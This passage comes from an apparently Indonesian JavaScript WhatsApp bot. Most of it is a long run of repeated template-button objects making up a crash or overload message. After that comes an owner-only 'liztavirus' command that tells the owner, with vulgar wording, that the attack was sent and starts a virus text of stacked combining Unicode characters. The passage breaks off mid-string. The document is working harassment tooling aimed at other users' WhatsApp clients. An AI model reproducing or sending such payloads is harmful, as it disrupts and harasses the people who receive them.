{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quoted: lep }
]})
}}
break
      case 'liztavirus': 
{  if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)           
        txts = `Succes ✅ "TUNGGU 2 MENIT YA KONTOL UNTUK KIRIM SANTET LAGI" <== DIBACA!!!`
        m.reply(txts)
        txtvir = ` JOKER IS HERE

        ☬➣᷁͢⃢🌹Ť̽ʜัɝ๎͢ • ʞᷤɪɳɢ̽⃢🇮🇩🔥ٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜ֗֗֗֗֗֗̍̍  
     *✅[LISTA WHATSAPP BY JOKER]✅*
       
     
     *99999* *ดฝทฟดฟ* *99999* *ดฝทฟดฟ*
